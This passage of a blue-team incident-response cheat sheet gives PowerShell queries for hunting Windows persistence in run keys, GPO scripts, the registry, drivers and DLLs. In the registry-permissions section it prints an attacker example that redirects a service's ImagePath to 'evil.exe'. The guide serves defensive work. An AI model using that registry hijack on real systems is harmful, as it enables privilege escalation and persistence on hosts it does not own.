Winlogon startup persistence

```powershell
#Create HKU drive
mount -PSProvider Registry -Name HKU -Root HKEY_USERS

(gci "HKU:\*\Software\Microsoft\Windows NT\CurrentVersion\Winlogon").PSPath | 
Foreach-Object {
  write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
  gp $_ | 
  select -property * -exclude PS* |
  FL
}
```
<img width="1429" alt="image" src="https://user-images.githubusercontent.com/44196051/203814780-c0915f3e-a594-460b-bf4d-c4776addcb86.png">

Find more examples of Run key evil from [Mitre ATT&CK](https://attack.mitre.org/techniques/T1547/001/)


##### Evidence of Run Key Execution
You can query the 'Microsoft-Windows-Shell-Core/Operational' log to find evidence if a registry run key was successful in executing. 

```powershell
get-winevent -filterhashtable @{ logname = "Microsoft-Windows-Shell-Core/Operational" ; ID = 9707} |
select TimeCreated, Message, 
@{Name="UserName";Expression = {$_.UserId.translate([System.Security.Principal.NTAccount]).value}}  | 
sort TimeCreated -desc| fl
```

<img width="1146" alt="image" src="https://user-images.githubusercontent.com/44196051/154504598-8c4dd53d-14ac-4c22-9e40-f37ae7ebebe4.png">


### Screensaver Persistence

It can be done, I swear. [Mitre ATT&CK](https://attack.mitre.org/techniques/T1546/002/) has instances of .SCR's being used to maintain regular persistence

```powershell
#Create HKU drive
mount -PSProvider Registry -Name HKU -Root HKEY_USERS

gp "HKU:\*\Control Panel\Desktop\" | select SCR* | fl
# you can then go and collect the .scr listed in the full path, and reverse engineer the binary

#you can also collect wallpaper info from here
gp "HKU:\*\Control Panel\Desktop\" | select wall* | fl
```
![image](https://user-images.githubusercontent.com/44196051/124333514-57ceb100-db8c-11eb-8695-280d12bcf0d5.png)

### Query Group Policy
The group policy in an Windows can be leveraged and weaponised to propogate malware and even ransomware across the entire domain

You can query the changes made in the last X days with this line

```powershell
#collects the domain name as a variable to use later
$domain = (Get-WmiObject -Class win32_computersystem).domain; 
Get-GPO -All -Domain $domain | 
?{ ([datetime]::today - ($_.ModificationTime)).Days -le 10 } | sort
# Change the digit after -le to the number of days you want to go back for
```

![2021-09-17_15-01](https://user-images.githubusercontent.com/44196051/133795473-3d817c69-2b9c-4d4a-b849-b37d1984ffc1.png)

#### Query GPO Scripts
We can hunt down the strange thinngs we might see in our above query

We can list all of the policies, and see where a policy contains a script or executable. You can change the `include` at the end to whatever you want
```powershell
$domain = (Get-WmiObject -Class win32_computersystem).domain;
gci -recurse \\$domain\\sysvol\$domain\Policies\ -file -include *.exe, *.ps1
```

![2021-09-17_15-20](https://user-images.githubusercontent.com/44196051/133798475-0da6d9f6-2dc6-4da2-9066-c79060f8ea84.png)

We can hunt down where GPO scripts live

```powershell
$domain = (Get-WmiObject -Class win32_computersystem).domain;
gci -recurse \\$domain\\sysvol\*\scripts
```
![2021-09-17_15-04](https://user-images.githubusercontent.com/44196051/133796067-d02398d1-be75-4c15-a3bc-41a8fb04158a.png)


### Autoruns
[Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) is a Sysinternals tool for Windows. It offers analysts a GUI method to examine the recurring tasks that an adversary might use for persistence and other scheduled malice.

Before you go anywhere cowboy, make sure you've filtered out the known-goods under options. It makes analysis a bit easier, as you're filtering out noise. Don't treat this as gospel though, so yes hide the things that VirusTotal and Microsoft SAY are okay.....but go and verify that those auto-running tasks ARE as legitimate as they suppose they are

![image](https://user-images.githubusercontent.com/44196051/137591938-cbe1fe12-0a3a-4304-aa9b-05bd97d903c3.png)

I personally just stick to the 'Everything' folder, as I like to have full visibility rather than go into the options one by one

![image](https://user-images.githubusercontent.com/44196051/137592010-68d39e4c-6bf5-4209-85e6-bfd9e92854e2.png)

Some things in autorun may immediately stick out to you as strange. Take for example the malicious run key I inserted on the VM as an example:

![image](https://user-images.githubusercontent.com/44196051/137592077-6842b87d-4a7f-4f20-92b6-7e6bc721c101.png)

You can right-click and ask Virus Total to see if the hash is a known-bad 

![image](https://user-images.githubusercontent.com/44196051/137592164-7880d919-9c76-4ad0-a65c-3a2bbec9dad6.png)

And you can right-click and ask autoruns to delete this recurring task from existence

![image](https://user-images.githubusercontent.com/44196051/137592197-d14f2913-d92e-4fad-b113-03aaf2c18019.png)


I like autoruns for digital forensics, where you take it one machine at a time. But - in my uneducated opinion - it does not scale well. A tool like Velociraptor that allows orchestration across thousands of machines can be leveraged to query things with greater granularity than Autoruns allows. 

This is why I like to use PowerShell for much of my blue team work on a Windows machine, where possible. I can pre-filter my queries so I don't get distraced by noise, but moreover I can run that fine-tuned PowerShell query network-wide across thosuands of machines and recieve the results back rapidly.

---

## File Queries

<details>
    <summary>section contents</summary>
  
  + [File Tree](#file-tree) 
  + [Wildcard paths and files](#wildcard-paths-and-files)
  + [Check if a specific file or path is alive.](#check-if-a-specific-file-or-path-is-alive)
  + [test if  files and directories are present or absent](#test-if--files-and-directories-are-present-or-absent)
  + [Query File Contents](#query-file-contents)
    - [Alternate data streams](#alternate-data-streams)
    - [Read hex of file](#read-hex-of-file)
  + [Recursively look for particular file types, and once you find the files get their hashes](#recursively-look-for-particular-file-types--and-once-you-find-the-files-get-their-hashes)
  + [Compare two files' hashes](#compare-two-files--hashes)
  + [Find files written after X date](#find-files-written-after-x-date)
    - [Remove items written after x date](#Remove-items-written-after-x-date)
  + [copy multiple files to new location](#copy-multiple-files-to-new-location)
  + [Grep in Powershell](#grep-in-powershell)
 
</details>

### File tree

Fire off `tree` to list the directories and files underneath your current working directory, nestled under each other

![image](https://user-images.githubusercontent.com/44196051/151773962-3b1dac5a-ff4c-4b09-bead-daa97703b650.png)


### Wildcard paths and files
You can chuck wildcards in directories for gci, as well as wildcard to include file types.

Let's say we want to look in all of the Users \temp\ directories. We don't want to put their names in, so we wildcard it.

We also might only be interested in the pwsh scripts in their \temp\, so let's filter for those only

```powershell
gci "C:\Users\*\AppData\Local\Temp\*" -Recurse -Force -File  -Include *.ps1, *.psm1, *.txt | 
ft lastwritetime, name -autosize | 
out-string -width 800
```
![image](https://user-images.githubusercontent.com/44196051/121200190-741c4e00-c86b-11eb-800e-f3170c2a02e5.png)


### Check if a specific file or path is alive. 

I've found that this is a great one to quickly check for specific vulnerabilities. Take for example, CVE-2021-21551. The one below this one is an excellent way of utilising the 'true/false' binary results that test-path can give
``` powershell
test-path -path "C:\windows\temp\DBUtil_2_3.Sys"
```
![image](https://user-images.githubusercontent.com/44196051/119982761-283def00-bfb7-11eb-83ab-061b6c628372.png)

### test if  files and directories are present or absent
This is great to just sanity check if things exist. Great when you're trying to check if files or directories have been left behind when you're cleaning stuff up.
```powershell
$a = Test-Path "C:\windows\sysmon.exe"; $b= Test-Path "C:\Windows\SysmonDrv.sys"; $c = test-path "C:\Program Files (x86)\sysmon"; $d = test-path "C:\Program Files\sysmon"; 
IF ($a -eq 'True') {Write-Host "C:\windows\sysmon.exe present"} ELSE {Write-Host "C:\windows\sysmon.exe absent"}; 
IF ($b -eq 'True') {Write-Host "C:\Windows\SysmonDrv.sys present"} ELSE {Write-Host "C:\Windows\SysmonDrv.sys absent"} ; 
IF ($c -eq 'True') {Write-Host "C:\Program Files (x86)\sysmon present"} ELSE {Write-Host "C:\Program Files (x86)\sysmon absent"}; 
IF ($d -eq 'True') {Write-Host "C:\Program Files\sysmon present"} ELSE {Write-Host "C:\Program Files\sysmon absent"}
```
![image](https://user-images.githubusercontent.com/44196051/119979754-443f9180-bfb3-11eb-9259-5409a0d98c04.png)

^ The above is a bit over-engineered. Here's an an abbrevated version
```powershell
$Paths = "C:\windows" , "C:\temp", "C:\windows\system32", "C:\DinosaurFakeDir" ; 
foreach ($Item in $Paths){if
(test-path $Item) {write "$Item present"}else{write "$Item absent"}}
```
![image](https://user-images.githubusercontent.com/44196051/120552156-c7ffe080-c3ee-11eb-8f81-3983cab8083b.png)

We can also make this conditional. Let's say if Process MemeProcess is NOT running, we can then else it to go and check if files exist
```powershell
$Paths = "C:\windows" , "C:\temp", "C:\windows\system32", "C:\DinosaurFakeDir" ; 
if (Get-Process | where-object Processname -eq "explorer") {write "process working"} else {
foreach ($Item in $Paths){if (test-path $Item) {write "$Item present"}else{write "$Item absent"}}}
```
![image](https://user-images.githubusercontent.com/44196051/120553995-1c0bc480-c3f1-11eb-811d-eca65d10328d.png)

You can use `test-path` to query Registry, but even the 2007 [Microsoft docs say](https://devblogs.microsoft.com/powershell/test-path-we-goofed/) that this can give inconsistent results, so I wouldn't bother with test-path for reg stuff when it's during an IR

### Query File Contents

Seen a file you don't recognise? Find out some more about it! Remember though: don't trust timestamps!
```powershell
Get-item C:\Temp\Computers.csv |
select-object -property @{N='Owner';E={$_.GetAccessControl().Owner}}, *time, versioninfo | fl 
```
![image](https://user-images.githubusercontent.com/44196051/120334042-3443ec80-c2e8-11eb-84a9-c141ca5198a8.png)

#### Alternate data streams
```powershell
# show streams that aren't the normal $DATA
get-item evil.ps1 -stream "*" | where stream -ne ":$DATA"
# If you see an option that isn't $DATA, hone in on it
get-content evil.ps1 -steam "evil_stream"
```
#### Read hex of file
```powershell
gc .\evil.ps1 -encoding byte | 
Format-Hex
```
![image](https://user-images.githubusercontent.com/44196051/120565546-3e0f4200-c405-11eb-9045-e38fc79e2810.png)

### Recursively look for particular file types, and once you find the files get their hashes
This one-liner was a godsend during the Microsoft Exchange ballache back in early 2021

```powershell
Get-ChildItem -path "C:\windows\temp" -Recurse -Force -File -Include *.aspx, *.js, *.zip|
Get-FileHash |
format-table hash, path -autosize | out-string -width 800
```
![image](https://user-images.githubusercontent.com/44196051/120917857-66b76600-c6a9-11eb-85f3-cce3ff502476.png)


### Compare two files' hashes
```powershell
get-filehash "C:\windows\sysmondrv.sys" , "C:\Windows\HelpPane.exe"
```
![image](https://user-images.githubusercontent.com/44196051/120772800-97b46100-c518-11eb-84bf-409640c516bc.png)

### Find files written after X date
I personally wouldn't use this for DFIR. It's easy to manipulate timestamps....plus, Windows imports the original compiled date for some files and binaries if I'm not mistaken

Change the variables in the first time to get what you're looking. Remove the third line if you want to include directories 
```powershell
$date = "12/01/2021"; $directory = "C:\temp"
get-childitem "$directory" -recurse|
where-object {$_.mode -notmatch "d"}| 
where-object {$_.lastwritetime -gt [datetime]::parse("$date")}|
Sort-Object -property LastWriteTime | format-table lastwritetime, fullname -autosize
```

![image](https://user-images.githubusercontent.com/44196051/120306808-2b442280-c2ca-11eb-82f8-bca23b5ee0d1.png)

#### Remove items written after x date
And then you can recursively remove the files and directories, in case malicious

```powershell
$date = "31/01/2022"; $directory = "C:\Users\Frank\AppData\"
get-childitem "$directory" -recurse|
where-object {$_.lastwritetime -gt [datetime]::parse("$date")}|
Sort-Object -property LastWriteTime | remove-item -confirm -whatif
```
![image](https://user-images.githubusercontent.com/44196051/151830903-2f1ff6c6-6994-4141-aa65-143f59ff96e9.png)

Remove the last -whatif flag to actaully detonate. Will ask you one at a time if you want to delete items. Please A to delete all

![image](https://user-images.githubusercontent.com/44196051/151830481-2de1dbcd-a4bf-43b6-a470-d13f7b366331.png)


### copy multiple files to new location
```powershell
copy-item "C:\windows\System32\winevt\Logs\Security.evtx", "C:\windows\System32\winevt\Logs\Windows PowerShell.evtx" -destination C:\temp
```

### Grep in Powershell

Change the string in the second line. You should run these one after another, as it will grep for things in unicode and then ascii. 

I like to use these as really lazy low-key yara rules. So grep for the string "educational purposes only" or something like that to catch malicious tooling - you'd be surprised how any vendors take open-source stuff, re-brand and compile it, and then sell it to you.....

```powershell
ls C:\Windows\System32\* -include '*.exe', '*.dll' | 
select-string 'RunHTMLApplication' -Encoding unicode | 
select-object -expandproperty path -unique

#and with ascii
ls C:\Windows\System32\* -include '*.exe', '*.dll' | 
select-string 'RunHTMLApplication' -Encoding Ascii | 
select-object -expandproperty path -unique
```

![image](https://user-images.githubusercontent.com/44196051/137937519-007d1d2a-b12d-4f76-acda-8eeb17f44f24.png)


---

## Registry Queries

<details>
    <summary>section contents</summary>

  + [A note on HKCU](#A-note-on-HKCU)
  + [Show reg keys](#show-reg-keys)
  + [Read a reg entry](#read-a-reg-entry)
  + [Quick useful reg keys](#quick-useful-reg-keys)
  + [Remove a reg entry](#remove-a-reg-entry)
    - [Removing HKCurrentUser Keys](#Removing-HKCurrentUser-Keys)
  + [Example Malicious Reg](#example-malicious-reg)
    - [Understanding Reg Permissions](#understanding-reg-permissions)
    - [Get-ACl](#get-acl)
    - [Convert SDDL](#convert-sddl)
    - [What could they do with poor permissions?](#what-could-they-do-with-poor-permissions)
  + [Hunting for Reg evil](#hunting-for-reg-evil)
    - [Filtering Reg ImagePath](#filtering-reg-imagepath)
  + [Query Background Activity Monitor](#query-background-activity-monitor)


</details>

## A note on HKCU

Just a note:
Anywhere you see a reg key does HKCU - this is Current User. Your results will be limited to the user you are.

To see more results, you should change the above from HKCU, to HKU. 

You often need the [SID of the users](https://www.windows-commandline.com/get-sid-of-user/) you want to go and look at their information.

So for example, a query like this:

`HKCU:\Control Panel\Desktop\`

Becomes:

`HKU\s-1-12-1-707864876-1224890504-1467553947-2593736053\Control Panel\Desktop`

HKU needs to be set up to work

```powershell
New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS;
(Gci -Path HKU:\).name
```
<img width="783" alt="image" src="https://user-images.githubusercontent.com/44196051/172839018-2575c3d3-3503-46c2-9ab5-a665f5723c07.png">


### Show reg keys

[Microsoft Docs](https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users) detail the regs: their full names, abbrevated names, and what their subkeys generally house 

```powershell
##show all reg keys
(Gci -Path Registry::).name

# show HK users
mount -PSProvider Registry -Name HKU -Root HKEY_USERS;(Gci -Path HKU:\).name

##lets take HKEY_CURRENT_USER as a subkey example. Let's see the entries in this subkey
(Gci -Path HKCU:\).name

# If you want to absolutely fuck your life up, you can list the names recursively....will take forever though
(Gci -Path HKCU:\ -recurse).name
```
![image](https://user-images.githubusercontent.com/44196051/119998273-75768c80-bfc8-11eb-869a-807a140d7a52.png)

### Read a reg entry
```powershell
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv"
```
![image](https://user-images.githubusercontent.com/44196051/119994436-832a1300-bfc4-11eb-98cb-b4148413ac97.png)


### Quick useful reg keys

Query timezone on an endpoint. Look for the TimeZoneKeyName value
* `HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation`

Query the drives on the endpoint 
* `HKLM\SYSTEM\MountedDevices`

Query the services on this machine, and if you want to see more about one of the results just add it to the path
* `HKLM\SYSTEM\CurrentControlSet\Services`
* `HKLM\SYSTEM\CurrentControlSet\Services\ACPI`

Query software on this machine
* `HKLM\Software`   
* `HKLM\Software\PickOne`

Query SIDs 
* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList`
* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\[Long-SID-Number-HERE]`

Query user's wallpaper. Once we know a user’s SID, we can go and look at these things: 
* `HKU\S-1-5-18\Control Panel\Desktop\`

Query if credentials on a machine are being [cached maliciously](https://blog.netwrix.com/2022/10/11/wdigest-clear-text-passwords-stealing-more-than-a-hash/)

```powershell
# can run this network-wide
if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest").UseLogonCredential -eq 1){write-host "Plain text credentials forced, likely malicious, on host: " -nonewline ;hostname } else { echo "/" }

#remediate the malice with this
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0
```

<img width="1406" alt="image" src="https://user-images.githubusercontent.com/44196051/202219578-b52631b8-b9a5-455f-989f-02ac959afc24.png">


### Remove a reg entry
If there's a malicious reg entry, you can remove it this way
```powershell

#Create HKU drive
mount -PSProvider Registry -Name HKU -Root HKEY_USERS

# Read the reg to make sure this is the bad boy you want
get-itemproperty -Path 'HKU:\*\Keyboard Layout\Preload\'
#remove it by piping it to remove-item
get-itemproperty -Path 'HKU:\*\Keyboard Layout\Preload\' | Remove-Item -Force -Confirm:$false -verbose
# double check it's gone by trying to re-read it
get-itemproperty -Path 'HKU:\*\Keyboard Layout\Preload\'
```
![image](https://user-images.githubusercontent.com/44196051/119999624-d8b4ee80-bfc9-11eb-9770-5ec6e78f9714.png)

#### Removing HKCurrentUser Keys
If a Registry is under `HKCU`, it's not clear exactly WHO it can belong to.

![image](https://user-images.githubusercontent.com/44196051/154506473-a0a0fa55-7296-4b65-81af-7f0b0f3dcf7b.png)

If a Registry is under `HKCU`, you can figure out WHICH username it belongs to but you can't just go into HKCU in your PwSh to delete it....because YOU are the current user.

Instead, get the [SID of the user](https://www.windows-commandline.com/get-sid-of-user/) 

And then you can traverse to that as the path as HKU. So for example, under User_Alfonso's reg keys

```powershell
#this
HKCU:\Software\AppDataLow\Software\Microsoft\FDBC3F8C-385A-37D8-2A81-EC5BFE45E0BF

#must become this. Notice the reg changes in the field field, and the SID gets sandwiched in
HKU:\S-1-5-21-912369493-653634481-1866108234-1004\Software\AppDataLow\Software\Microsoft\FDBC3F8C-385A-37D8-2A81-EC5BFE45E0BF
```

To just generally convert them

```powershell

mount -PSProvider Registry -Name HKU -Root HKEY_USERS

```
<img width="679" alt="image" src="https://user-images.githubusercontent.com/44196051/172854420-0b2ae233-74f9-4fed-bd8b-84ef60827377.png">

### Understanding Reg Permissions

Reg permissions, and ACL and SDDL in general really, are a bit long to understand. But worth it, as adversaries like using the reg.

Adversaries will look for registries with loose permissions, so let's show how we first can identify loose permissions

#### Get-ACl

The Access Control List (ACL) considers the permissions associated with an object on a Windows machine. It's how the machine understands privileges, and who is allowed to do what.

Problem is, if you get and `get-acl` for a particular object, it ain't a pretty thing

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\ | fl
```
There's a lot going on here. Moreover, what the fuck is that SDDL string at the bottom? 

The Security Descriptor Definition Language (SDDL) is a representation for ACL permissions, essentially

![image](https://user-images.githubusercontent.com/44196051/120821264-378be200-c54d-11eb-8ca6-436393b3fb8e.png)

#### Convert SDDL
You could figure out what the wacky ASCII chunks mean in SDDL....but I'd much rather convert the permissions to something human readable

Here, an adversary is looking for a user they control to have permissions to maniptulate the service, likely they want *Full Control*
```powershell
$acl = Get-Acl -Path hklm:\System\CurrentControlSet\services\;
ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl[0]};
ConvertFrom-SddlString -Sddl $acl.Sddl -Type RegistryRights | Foreach-Object {$_.DiscretionaryAcl[0]}
# bottom one specifices the  registry access rights when you create RegistrySecurity objects
```
![image](https://user-images.githubusercontent.com/44196051/120823443-58edcd80-c54f-11eb-850f-4f0049bcae95.png)


#### What could they do with poor permissions?

An adversary in control of a loosely permissioned registry entry for a service, for example, could give themselves a privesc or persistence. For example:
```powershell
#don't actually run this
Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\example_service -name ImagePath -value "C:\temp\evil.exe"
```
### Hunting for Reg evil

Now we know how reg entries are compromised, how can we search? 

The below takes the services reg as an example, and searches for specifically just the reg-key Name and Image Path. 
 
```powershell

Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

#You can search recursively with this, kind of, if you use wildcards in the path names. Will take longer if you do recursively search though
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\**\*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

# This one-liner is over-engineered. # But it's a other way to be recursive if you start from a higher directory in reg
# will take a while though
$keys = Get-ChildItem -Path "HKLM:\System\CurrentControlSet\" -recurse -force ;
$Items = $Keys | Foreach-Object {Get-ItemProperty $_.PsPath };
ForEach ($Item in $Items) {"{0,-35} {1,-10} " -f $Item.PSChildName, $Item.ImagePath} 
```

![image](https://user-images.githubusercontent.com/44196051/120918169-e560d300-c6aa-11eb-98a4-a9a27f264a0b.png)

#### Filtering Reg ImagePath

Let's continue to use the \Services\ reg as our example. 

Remember in the above example of a malicious reg, we saw the ImagePath had the value of C:\temp\evil.exe. And we're seeing a load of .sys here. So can we specifically just filter for .exes in the ImagePath. 

I have to mention, don't write .sys files off as harmless. Rootkits and bootkits weaponise .sys, for example.

If you see a suspicious file in reg, you can go and collect it and investigate it, or collect it's hash. When it comes to the ImagePath, \SystemRoot\ is usually C:\Windows\, but you can confirm with `$Env:systemroot` . 

```powershell
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
where ImagePath -like "*.exe*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

# if you notice, on line two we wrap .exe in TWO in wildcards. Why? 
  # The first wildcard is to ensure we're kind of 'grepping' for a file that ends in a .exe. 
    # Without the first wildcard, we'd be looking for literal .exe
  # The second wildcard is to ensure we're looking for the things that come after the .exe
     # This is to make sure we aren't losing the flags and args of an executable

# We can filter however we wish, so we can actively NOT look for .exes
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
where ImagePath -notlike "*.exe*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

#fuck it, double stack your filters to not look for an exe or a sys...not sure why, but go for it!
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
? {($_.ImagePath -notlike "*.exe*" -and $_.Imagepath -notlike "*.sys*")} | 
ft PSChildName, ImagePath -autosize | out-string -width 800 

#If you don't care about Reg Entry name, and just want the ImagePath
(Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*").ImagePath  

```
![image](https://user-images.githubusercontent.com/44196051/120833359-9bb4a300-c559-11eb-8647-69d990227dbb.png)

### Query Background Activity Moderator

BAM only in certain Windows 10 machines. Provides full path of the executabled last execution time

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\bam\state\UserSettings" /s
# or HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\
```

OR [BAMParser.ps1](https://github.com/mgreen27/Invoke-LiveResponse/blob/master/Content/Other/Get-BAMParser.ps1)


<img width="1185" alt="image" src="https://user-images.githubusercontent.com/44196051/154823070-a7a06243-0744-413f-9d34-00fd3f5eb0c2.png">

<img width="1415" alt="image" src="https://user-images.githubusercontent.com/44196051/154823082-094ebdbc-5b20-47f2-87b7-479e371de566.png">


---


## Driver Queries

<details>
    <summary>section contents</summary>
  
  + [Printer Drivers](#printer-drivers)
  + [System Drivers](#system-drivers)
    - [Unsigned](#unsigned)
    - [Signed](#Signed)
  + [Other Drivers](#other-drivers)
  + [Drivers by Registry](#drivers-by-registry)
  + [Drivers by Time](#drivers-by-time)
 
</details>

Drivers are an interesting one. It isn't everyday you'll see malware sliding a malicious driver in ; bootkits and rootkits have been known to weaponise drivers. But it's well worth it, because it's an excellent method for persistence if an adversary can pull it off without blue-screening a machine. You can read more about it [here](https://eclypsium.com/wp-content/uploads/2019/11/Mother-of-All-Drivers.pdf)

You can utilise [Winbindex](https://winbindex.m417z.com) to investigate drivers, and compare a local copy you have with the indexed info. Malicious copies may have a hash that doesn't match, or a file size that doesn't quite match.

![image](https://user-images.githubusercontent.com/44196051/121807617-d4850400-cc4c-11eb-9a47-8b3e18bfe48f.png)


### Printer Drivers

```powershell
Get-PrinterDriver | fl Name, *path*, *file* 
```

![image](https://user-images.githubusercontent.com/44196051/121266294-2545d700-c8b2-11eb-927e-45b81f6539e6.png)

### System Drivers

If drivers are or aren't signed, don't use that as the differentiation for what is legit and not legit. Some legitimate drivers are not signed ; some malicious drivers sneak a signature. 


#### Unsigned

Get unsigned drivers. Likely to not return much

```powershell
gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf|
Get-AuthenticodeSignature | 
? Status -ne "Valid" | ft -autosize

gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
Get-AuthenticodeSignature | 
? Status -ne "Valid" | ft -autosize

```

#### Signed

Get the signed ones. Will return a lot. 

```powershell
Get-WmiObject Win32_PnPSignedDriver | 
fl DeviceName, FriendlyName, DriverProviderName, Manufacturer, InfName, IsSigned, DriverVersion

# alternatives
gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
Get-AuthenticodeSignature | 
? Status -eq "Valid" | ft -autosize 
#or
gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf|
Get-AuthenticodeSignature | 
? Status -eq "Valid" | ft -autosize 

```

![image](https://user-images.githubusercontent.com/44196051/121267019-6ee2f180-c8b3-11eb-83e9-d4f9218dfdaf.png)

![image](https://user-images.githubusercontent.com/44196051/121755059-207d5f00-cb0e-11eb-82b0-8a90e13153ac.png)


### Other Drivers 

Gets all 3rd party drivers 

```powershell
Get-WindowsDriver -Online -All | 
fl Driver, ProviderName, ClassName, ClassDescription, Date, OriginalFileName, DriverSignature 
```
![image](https://user-images.githubusercontent.com/44196051/121268822-97b8b600-c8b6-11eb-87ba-787fa5dd4d92.png)


### Drivers by Registry

You can also leverage the Registry to look at drivers
```powershell
#if you know the driver, you can just give the full path and wildcard the end if you aren't sure of full spelling
get-itemproperty -path "HKLM:\System\CurrentControlSet\Services\DBUtil*" 

#You'll likely not know the path though, so just filter for drivers that have \drivers\ in their ImagePath
get-itemproperty -path "HKLM:\System\CurrentControlSet\Services\*"  | 
? ImagePath -like "*drivers*" | 
fl ImagePath, DisplayName
```
(![image](https://user-images.githubusercontent.com/44196051/121329227-eb55ee80-c90c-11eb-808d-0e24fdfd2594.png)


### Drivers by Time

Look for the drivers that exist via directory diving.. We can focus on .INF and .SYS files, and sort by the time last written.

```powershell
#change to LastWriteTimeUtc if you need to.

# first directory location
gci C:\Windows\*\DriverStore\FileRepository\ -recurse -include *.inf | 
sort-object LastWriteTime -Descending |
ft FullName,LastWriteTime | out-string -width 850

# second driver location
gci -path C:\Windows\System32\drivers -include *.sys -recurse -ea SilentlyContinue | 
sort-object LastWriteTime -Descending |
ft FullName,LastWriteTime | out-string -width 850
```

![image](https://user-images.githubusercontent.com/44196051/121754106-acda5280-cb0b-11eb-9b5c-6c2195e17ef7.png)


## DLL Queries

<details>
    <summary>section contents</summary>
  
  + [DLLs used in Processes](#dlls-used-in-processes)
    - [Investigate Process DLLs](#investigate-process-dlls)
  + [Investigate DLLs](#investigate-dlls)
    - [Generically](#generically)
    - [Invalid](#invalid)
    - [Specifically](#specifically)
      - [Verify](#verify)
</details>

### DLLs Used in Processes
We've already discussed how to show [DLLs used in processes](#show-all-dlls-loaded-with-a-process)

But what about getting _granular_. Well, let's pick on a specific process we can see running, and let's get the DLLs involved, their file location, their size, and if they have a company name

```powershell
get-process -name "google*" | 
Fl @{l="Modules";e={$_.Modules | fl FileName, Size, Company | out-string}}

#alterntive version, just print filepath of specific process' DLL
(gps -name "google*").Modules.FileName
```
![image](https://user-images.githubusercontent.com/44196051/121806180-ba482780-cc46-11eb-99b3-c8e93ac53708.png)

You can in theory run this without specifying a process, and it will just retrieve all of the DLLs involved in all the processes. But this will be LONG man.

#### Investigate Process Dlls
We can zero in on the DLLs that a process may call on
```powershell
(gps -name "google").Modules.FileName | Get-AuthenticodeSignature
```
![image](https://user-images.githubusercontent.com/44196051/121806887-9df9ba00-cc49-11eb-86e6-e42f609ca995.png)


### Investigate DLLs
#### Generically

This will return a lot of DLLs and their last write time. I personally would avoid this approach

```powershell
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll | fl Name, Lastwritetime

#to get signature codes for these pipe it
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll | Get-AuthenticodeSignature
#to get hashes for these, pipe it too
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll | get-filehash
```
![image](https://user-images.githubusercontent.com/44196051/121806606-77874f00-cc48-11eb-97bc-5cdea18c9513.png)

#### Invalid

Like drivers, if a DLL is signed or un-signed, it doesn't immediately signal malicious. There are plenty of official files on a Windows machine that are unsigned. Equally, malicious actors can get signatures for their malicious files too. 

You'll get a lot of results if you look for VALID, signed DLLs. So maybe filter for INVALID ones first. Both will take some time
```powershell

#get invalid
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll |
Get-AuthenticodeSignature | ? Status -ne "Valid" 

#collect valid ones with this command
gci -path C:\Windows\*, C:\Windows\System32\*  -file -force -include *.dll |
Get-AuthenticodeSignature | ? Status -eq "Valid" 
```

![image](https://user-images.githubusercontent.com/44196051/121807259-478d7b00-cc4b-11eb-99f5-ec92f341c319.png)


#### Specifically

We can apply all of the above to individual DLLs. If I notice something strange during the [process' DLL hunt](#dlls-used-in-processes), or if I had identified a DLL with [an invalid signature](#invalid). I'd then hone in on that specific DLL.

```powershell
gci -path C:\Windows\twain_32.dll | get-filehash
gci -path C:\Windows\twain_32.dll | Get-AuthenticodeSignature 
```
![image](https://user-images.githubusercontent.com/44196051/121808044-b4564480-cc4e-11eb-896d-8a22302e30c2.png)

##### Verify

If you need to verify what a DLL is, you have a myriad of ways. One way is through [Winbindex](https://winbindex.m417z.com)

Here, you can put the name of a DLL (or many of other filetypes), and in return get a whole SLUETH of data. You can compare the file you have locally with the Winbindex info, which may highlight malice - for example, does the hash match ? Or, is your local copy a much larger file size than the suggested size in the index?

![image](https://user-images.githubusercontent.com/44196051/121807482-401aa180-cc4c-11eb-9dff-5efd9107a3cf.png)

If not Windex, you have the usual Google-Fu methods, and having the file hash will aid you [here](#specifically)

## AV Queries

<details>
    <summary>section contents</summary>

  + [Query Defender](#query-defender)
     - [Trigger Defender Scan](#trigger-defender-scan)
     - [Check if Defender has been manipulated](#Check-if-Defender-has-been-manipulated)
     - [Enable Defender monitoring](#Enable-Defender-monitoring)
  
</details>

### Query Defender

If you have Defender active on your windows machine, you can leverage PowerShell to query what threats the AV is facing

This simple command will return all of the threats. In the screenshot below, it shows someone attempted to download mimikatz.

```powershell
Get-MpThreatDetection
```

